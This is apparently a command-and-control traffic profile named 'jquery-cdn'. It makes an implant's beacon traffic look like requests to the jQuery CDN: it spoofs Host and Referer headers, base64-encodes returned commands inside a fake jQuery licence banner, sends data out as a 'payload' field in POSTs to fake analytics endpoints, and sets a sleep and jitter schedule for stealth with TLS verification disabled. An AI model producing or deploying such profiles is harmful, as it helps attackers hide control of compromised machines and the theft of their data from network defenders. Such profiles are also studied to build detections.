name: "jquery-cdn"
description: "Mimics jQuery CDN traffic - blends with web development environments"

http:
  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0"
  
  headers:
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    Accept-Language: "en-US,en;q=0.5"
    Accept-Encoding: "gzip, deflate, br"
    
  get:
    uri:
      - "/jquery-3.6.0.min.js"
      - "/jquery-3.6.0.slim.min.js"
      - "/jquery-ui.min.js"
      - "/jquery.validate.min.js"
      - "/jquery.form.min.js"
    headers:
      Host: "code.jquery.com"
      Referer: "https://jquery.com/"
      Cache-Control: "max-age=31536000"
    transform:
      encode: "base64"
      prepend: "/*! jQuery v3.6.0 | (c) OpenJS Foundation | jquery.org/license */\n"
      append: "\n//# sourceMappingURL=jquery.min.map"
      
  post:
    uri:
      - "/api/analytics"
      - "/api/metrics"
      - "/api/usage"
      - "/api/track"
    headers:
      Content-Type: "application/json"
      Host: "analytics.jquery.com"
    transform:
      encode: "base64"
      wrapper: '{"version":"3.6.0","payload":"%%DATA%%","timestamp":%%TIMESTAMP%%}'

timing:
  sleep: 90  # 1min30 - plus discret
  jitter: 30
  max_retry: 3

ssl:
  certificate: "certs/jquery.pem"
  verify: false
